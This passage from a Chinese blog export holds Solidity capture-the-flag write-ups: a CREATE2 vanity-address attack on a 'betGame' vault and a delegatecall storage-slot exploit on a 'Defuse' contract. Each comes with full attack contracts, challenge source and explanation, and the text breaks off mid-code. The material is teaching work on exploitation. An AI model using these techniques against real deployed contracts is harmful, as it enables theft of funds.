class="headerlink" title="攻击合约代码"></a>攻击合约代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.12;</span><br><span class="line">contract attack&#123;</span><br><span class="line">    address bet =0x07cbF889a6637161fED5bf44F041C7B2577B11d4;</span><br><span class="line">    constructor()public&#123;</span><br><span class="line">        bet.call(abi.encodeWithSignature(&quot;share_my_vault()&quot;));</span><br><span class="line">        bet.call(abi.encodeWithSignature(&quot;payforflag()&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">    function complete()public&#123;</span><br><span class="line">        bet.call(abi.encodeWithSignature(&quot;payforflag()&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract DeployAttack &#123;</span><br><span class="line">    bytes attackCode =hex&quot;60806040527307cbf889a6637161fed5bf44f041c7b2577b11d46000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561006457600080fd5b5060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166040516024016040516020818303038152906040527fa3442ead000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b60208310610152578051825260208201915060208101905060208303925061012f565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d80600081146101b4576040519150601f19603f3d011682016040523d82523d6000602084013e6101b9565b606091505b50505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166040516024016040516020818303038152906040527f80e10aa5000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b602083106102a95780518252602082019150602081019050602083039250610286565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d806000811461030b576040519150601f19603f3d011682016040523d82523d6000602084013e610310565b606091505b5050506101c9806103226000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063522e117714610030575b600080fd5b61003861003a565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166040516024016040516020818303038152906040527f80e10aa5000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b602083106101275780518252602082019150602081019050602083039250610104565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d8060008114610189576040519150601f19603f3d011682016040523d82523d6000602084013e61018e565b606091505b50505056fea2646970667358221220af4e9499f2a89de6b970823460e18bf4f4072f402e041566c4e0ade88ff5e8aa64736f6c634300060c0033&quot;;</span><br><span class="line">    </span><br><span class="line">    function deploy(bytes32 salt) public &#123;</span><br><span class="line">        bytes memory bytecode = attackCode;</span><br><span class="line">        address addr;</span><br><span class="line">        assembly &#123;</span><br><span class="line">        addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function getHash()public view returns(bytes32)&#123;</span><br><span class="line">        return keccak256(attackCode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="全过程"><a href="#全过程" class="headerlink" title="全过程"></a>全过程</h2><p><img src="/2023/06/23/00.security/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/1.jpg" alt></p><p><img src="/2023/06/23/00.security/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/2.png" alt></p><p><img src="/2023/06/23/00.security/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/3.png" alt></p><p><img src="/2023/06/23/00.security/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/4.png" alt></p><p><img src="/2023/06/23/00.security/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/5.png" alt></p><p><img src="/2023/06/23/00.security/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/6.png" alt></p><p>deploy方法调用，在metamask确认交易的时候，需要编辑交易的gas，否则会执行失败（在区块链浏览器中会打感叹号，如图）</p><p><img src="/2023/06/23/00.security/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/gas设置.png" alt></p><p><img src="/2023/06/23/00.security/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/7.png" alt></p><p>执行完deploy就已经攻击成功了，不再需要调用payforflag和share_my_vault方法，因为attack.sol的构造器中已经调用过了。再次调用只会报错无法调用。</p><p><img src="/2023/06/23/00.security/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/8.png" alt></p><p><img src="/2023/06/23/00.security/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/9.png" alt></p><p><img src="/2023/06/23/00.security/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/10.png" alt></p><p><img src="/2023/06/23/00.security/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/11.jpg" alt></p><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.12;</span><br><span class="line"></span><br><span class="line">contract betToken&#123;</span><br><span class="line">    mapping(address=&gt;uint)public balance;</span><br><span class="line"></span><br><span class="line">    constructor()public&#123;</span><br><span class="line">         balance[msg.sender] += 10000000 *10 **18;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address account)public view returns(uint)&#123;</span><br><span class="line">         return balance[account];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to,uint amount)external&#123;</span><br><span class="line">        _transfer(msg.sender,to,amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _transfer(address from,address to,uint amount)internal&#123;</span><br><span class="line">        require(balance[from] &gt;= amount,&quot;amount exceed&quot;);</span><br><span class="line">        require(to != address(0),&quot;you cant burn my token&quot;);</span><br><span class="line">        require(balance[to]+amount &gt;= balance[to]);</span><br><span class="line">        balance[from] -= amount;</span><br><span class="line">        balance[to] += amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract betGame&#123;</span><br><span class="line">    //only my family can use the whole contract</span><br><span class="line"></span><br><span class="line">    // i will check your appearance to check if you are my family</span><br><span class="line">    betToken public token;</span><br><span class="line"></span><br><span class="line">    bytes20 internal appearance = bytes20(bytes32(&quot;ZT&quot;))&gt;&gt;144;</span><br><span class="line">    bytes20 internal maskcode = bytes20(uint160(0xffff));</span><br><span class="line"></span><br><span class="line">    mapping(address=&gt;bool)public status;</span><br><span class="line"></span><br><span class="line">    event SendFlag(address addr);</span><br><span class="line"></span><br><span class="line">    constructor()public&#123;</span><br><span class="line">        token = new betToken();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier only_family&#123;</span><br><span class="line">        require(is_my_family(msg.sender),</span><br><span class="line">        &quot;no no no,my family only&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier only_EOA&#123;</span><br><span class="line">        uint x;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            x := extcodesize(caller())</span><br><span class="line">            &#125;</span><br><span class="line">        require(x == 0,&quot;Only EOA can do that&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function is_my_family(address account) internal returns (bool) &#123;</span><br><span class="line">        bytes20 you = bytes20(account);</span><br><span class="line"></span><br><span class="line">        bytes20 code = maskcode;</span><br><span class="line">        bytes20 feature = appearance;</span><br><span class="line"></span><br><span class="line">        for (uint256 i = 0; i &lt; 34; i++) &#123;</span><br><span class="line">            if (you &amp; code == feature) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            code &lt;&lt;= 4;</span><br><span class="line">            feature &lt;&lt;= 4;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    function share_my_vault()external only_EOA only_family&#123;</span><br><span class="line">        token.transfer(msg.sender,token.balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     function payforflag() public&#123;</span><br><span class="line">        require(token.balance(msg.sender) &gt;= 10000000 *10 **18, &quot;Try again&quot;);</span><br><span class="line">        emit SendFlag(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>03.delegate漏洞_1</title>
      <link href="/2023/06/23/00.security/03.delegatecallA%CC%82I%CC%87h%CC%82%C2%B4_1/03.delegateA%CC%82I%CC%87h%CC%82%C2%B4_1/"/>
      <url>/2023/06/23/00.security/03.delegatecallA%CC%82I%CC%87h%CC%82%C2%B4_1/03.delegateA%CC%82I%CC%87h%CC%82%C2%B4_1/</url>
      
        <content type="html"><![CDATA[<h1 id="delegate漏洞"><a href="#delegate漏洞" class="headerlink" title="delegate漏洞"></a>delegate漏洞</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>任务描述：将setup.sol中的isSolved方法返回true，分析一下，实质是将defuse合约中的powerState修改为true。</p><p>该任务描述的项目业务：</p><p><img src="https://moe.photo/images/2023/05/21/1..jpg" alt></p><p>攻击思路：</p><p><img src="https://moe.photo/images/2023/05/21/8e6c9b15ba31d089819a08ff4d7f082f.jpg" alt></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>查看题目给我们的代码发现，我们的任务是让isSolved()返回true，实际上是想办法将defuse中的powerState状态从true修改为false。但是我们查看Defuse的方法里面，没有任何一个方法可以修改powerState，但是有一个函数setCountDownTimer()，方法体里面有delegatecall方法，这里就是突破点。</p><p>delegatecall的性质简述：调用外部合约的方法修改本合约的内容。详细描述见本文件夹下关于delegatecall文件。因此，我们可以利用delegatecacll的性质，另外攻击合约，来修改Defuse里面的powerState变量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//突破点</span><br><span class="line">function setCountDownTimer(uint256 _deadline) public onlyOwner notExplode &#123;</span><br><span class="line">launcherAddress.delegatecall(abi.encodeWithSignature(&quot;changedeadline(uint256)&quot;,_deadline));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此方法是launcherAddress来调用外部合约的方法修改本合约的内容，因此我们可以：将launcherAddress修改成攻击合约的地址，再用调用攻击合约的方法【新写changedeadline(uint256)来攻击】来修改powerState变量。</p><h3 id="如何修改launcherAddress"><a href="#如何修改launcherAddress" class="headerlink" title="如何修改launcherAddress"></a>如何修改launcherAddress</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>第一次调用setCountDownTimer(uint256)，会根据传入的参数_deadline来修改defuse合约中的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function setCountDownTimer(uint256 _deadline) public onlyOwner notExplode &#123;</span><br><span class="line">        launcherAddress.delegatecall(abi.encodeWithSignature(&quot;changedeadline(uint256)&quot;,_deadline));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们知道，在solidity中，delegatecall方式调用其他合约的方法来修改本合约的状态变量，是根据插槽对应位置而非状态变量的名字。比如：A合约的变量a所在插槽为0，那么B合约调用A合约的setA()，就算B合约有个相同的变量a（不在第0插槽位置），也只会修改B合约插槽0的变量而不修改变量a</p><p>一个插槽满了32字节，或者剩余位置放不下这个状态变量，才会放到下一个插槽。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">//插槽对比</span><br><span class="line"></span><br><span class="line">contract Launcher&#123;</span><br><span class="line">//uint256为32字节，占满32个字节，也就是第一个插槽满了</span><br><span class="line">    uint256 public deadline;//slot[0]</span><br><span class="line">    </span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        deadline = block.number + 100;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function changedeadline(uint256 _deadline) public &#123;</span><br><span class="line">        deadline = _deadline;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Defuse&#123;</span><br><span class="line">//slot[0]:Explode(1字节),launcherAddress(20字节)。slot[0]剩余11字节</span><br><span class="line">//slot[1]:passowrd(32字节)。slot[1]剩余0字节</span><br><span class="line">//slot[2]:powerState(1字节)。slot[2]剩余31字节</span><br><span class="line">    bool public Explode = false;//slot[0]</span><br><span class="line">    address public launcherAddress;//slot[0]</span><br><span class="line">    bytes32 private password;//slot[1]</span><br><span class="line">    bool public powerState = true;//slot[2]</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是launcher合约写的有问题！我们调用changedeadline(uint256)之后，会修改Defuse的第0个插槽的变量，即false和launcherAddress。</p><h4 id="满足修饰符的检验"><a href="#满足修饰符的检验" class="headerlink" title="满足修饰符的检验"></a>满足修饰符的检验</h4><p>因为setCountDownTimer(uint256)方法有两个修饰符onlyOwner和notExplode，只有通过这两个修饰符才可以调用方法修改launcherAddress</p><h5 id="onlyowner"><a href="#onlyowner" class="headerlink" title="onlyowner()"></a>onlyowner()</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">modifier onlyOwner()&#123;</span><br><span class="line">        require(checkPassword() == password);</span><br><span class="line">        require(msg.sender != tx.origin);</span><br><span class="line">        uint x;</span><br><span class="line">        assembly &#123; x := extcodesize(caller) &#125;</span><br><span class="line">        require(x == 0);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>第一个条件<code>require(checkPassword() == password)</code>，需要我们输入正确的密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function checkPassword() public returns (bytes32 result)  &#123;</span><br><span class="line">        bytes memory msgdata = msg.data;</span><br><span class="line">        if (msgdata.length == 0) &#123;</span><br><span class="line">            return 0x0;</span><br><span class="line">        &#125;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            result := mload(add(msgdata, add(0x20, 0x24)))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>result := mload(add(msgdata, add(0x20, 0x24)))</code>解释：</p><ul><li>add(0x20,0x24)：将这两个数加起来，就是0x44，十六进制</li><li>add(msgdata,0x44)：从msgdata的地址(指针)的地方，跳过0x44字节的数据</li><li>mload(p…p+32)：跳过0x44字节之后，取32字节</li><li>注意：在内联汇编中，bytes在内存中是一个地址，存放的是字节的长度，实际数据紧跟其后。因此，整句话的逻辑如下图：<ul><li>将msg.data加载进内存当中，内存的0~31bytes存放的是msg.data的长度，msgdata相当于内存的地址，有指针的味道</li><li>内存的32~35bytes存放的是函数选择器</li><li>内存的36~67bytes存放的是<code>setCountDownTimer(_uint256)</code>的形参</li><li>内存的68~99bytes存放的是我们额外添加的数据，与参数无关，为的是将calldata载入内存之后该位置的数据是password</li></ul></li></ul><p><img src="https://moe.photo/images/2023/05/21/_20230521220923.png" alt></p><p>如何去查看合约在创建的时候输入的密码呢？因为区块链上面的任何信息都是公开透明的，即使是private都可以查询。</p><p><img src="https://moe.photo/images/2023/05/21/30e23b13209065f1bebf75131184edfa.jpg" alt></p><p>第二个条件<code>require(msg.sender != tx.origin)</code>，也就是交易的发起者与本合约的调用者不相等，我们需要一个中间合约去调用。意思是我们不可以直接调用，要用一个合约去调用它</p><p>第三个条件<code>require(x == 0)</code></p><p>extcodesize(caller)的意思是调用者的关联地址长度为零，但智能合约地址肯定是不为零的，因此我们就需要清楚，在合约尚未完成构造时，合约的关联代码为零。同时也因为这个条件，任何人（就算是owner）也无法直接调用方法，必须在合约尚未构造完成时进行调用方法才行。</p><h5 id="notExplode"><a href="#notExplode" class="headerlink" title="notExplode()"></a>notExplode()</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">modifier notExplode()&#123;</span><br><span class="line">        launcher = Launcher(launcherAddress);</span><br><span class="line">        require(block.number &lt; launcher.deadline());</span><br><span class="line">        Explode = true;</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>条件：这个修饰符要求我们执行函数时，区块数量要在合约创建时的区块数量的一百块之内，尽快进行攻击就行，如果超过了就只能重新部署。</p><p>我们修改launcherAddress成为的攻击合约之后，攻击合约必须有deadline属性，同时要满足block.number &lt; launcher.deadline</p><h3 id="如何修改powerState"><a href="#如何修改powerState" class="headerlink" title="如何修改powerState"></a>如何修改powerState</h3><p>将launcherAddress修改成为攻击合约地址后，再次调用setCountDownTimer(uint256)即可</p><h2 id="题目源代码"><a href="#题目源代码" class="headerlink" title="题目源代码"></a>题目源代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.10;</span><br><span class="line"></span><br><span class="line">contract Defuse&#123;</span><br><span class="line">    bool public Explode = false;</span><br><span class="line">    address public launcherAddress;</span><br><span class="line">    bytes32 private password;</span><br><span class="line">    bool public powerState = true;</span><br><span class="line">    bytes4 constant launcher_start_function_hash = bytes4(keccak256(&quot;changedeadline(uint256)&quot;));</span><br><span class="line">    Launcher launcher;</span><br><span class="line"></span><br><span class="line">    function checkPassword() public returns (bytes32 result)  &#123;</span><br><span class="line">        bytes memory msgdata = msg.data;</span><br><span class="line">        if (msgdata.length == 0) &#123;</span><br><span class="line">            return 0x0;</span><br><span class="line">        &#125;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            result := mload(add(msgdata, add(0x20, 0x24)))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner()&#123;</span><br><span class="line">        require(checkPassword() == password);</span><br><span class="line">        require(msg.sender != tx.origin);</span><br><span class="line">        uint x;</span><br><span class="line">        assembly &#123; x := extcodesize(caller) &#125;</span><br><span class="line">        require(x == 0);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier notExplode()&#123;</span><br><span class="line">        launcher = Launcher(launcherAddress);</span><br><span class="line">        require(block.number &lt; launcher.deadline());</span><br><span class="line">        Explode = true;</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor(address _launcherAddress, bytes32 _fakeflag) public &#123;</span><br><span class="line">        launcherAddress = _launcherAddress;</span><br><span class="line">        password = _fakeflag ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setCountDownTimer(uint256 _deadline) public onlyOwner notExplode &#123;</span><br><span class="line">        launcherAddress.delegatecall(abi.encodeWithSignature(&quot;changedeadline(uint256)&quot;,_deadline));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Setup &#123;</span><br><span class="line">    Defuse public defuse;</span><br><span class="line"></span><br><span class="line">    constructor(bytes32 _password) public &#123;</span><br><span class="line">        defuse = new Defuse(address(new Launcher()), _password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns (bool) &#123;</span><br><span class="line">        return defuse.powerState() == false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Launcher&#123;</span><br><span class="line">    uint256 public deadline;</span><br><span class="line">    function changedeadline(uint256 _deadline) public &#123;</span><br><span class="line">        deadline = _deadline;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        deadline = block.number + 100;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">    Defuse defuse;</span><br><span class="line">    constructor(address _addr) public&#123;</span><br><span class="line">        defuse = Defuse(_addr);</span><br><span class="line">        //修改launcherAddress</span><br><span class="line">        //（1）第一个参数0x000000000000000000000085A33A74098A4Fc235c4225417745805129e16b100：</span><br><span class="line">        //为了修改launcherAddress成为攻击合约</span><br><span class="line">        //攻击合约是85A33A74098A4Fc235c4225417745805129e16b1，但为什么参数是前面后面有0？</span><br><span class="line">        //后面的两个00是Explode,1个字节8bit，即占2位</span><br><span class="line">        //launcherAddress是address为20字节，即40位</span><br><span class="line">        //前面的一大串0即插槽0剩余的11个字节位置</span><br><span class="line">        //（2）第二个参数0x50ff0f52db8fd58abf094db7ef8e56acd1e5250dcb9dbd6e5a5b3f2b67d00e3a：</span><br><span class="line">        //即onlyOwner修饰器需要传入的msg.data，即password</span><br><span class="line">        address(defuse).call(abi.encodeWithSignature(&quot;setCountDownTimer(uint256)&quot;,</span><br><span class="line">        0x000000000000000000000085A33A74098A4Fc235c4225417745805129e16b100,</span><br><span class="line">        0x50ff0f52db8fd58abf094db7ef8e56acd1e5250dcb9dbd6e5a5b3f2b67d00e3a));</span><br><span class="line">        //修改powerState</span><br><span class="line">        //0x000000000000000000000085A33A74098A4Fc235c4225417745805129e16b100其实可以是任何数，</span><br><span class="line">        //因为我写的changedeadline的输入的形参没有任何作用</span><br><span 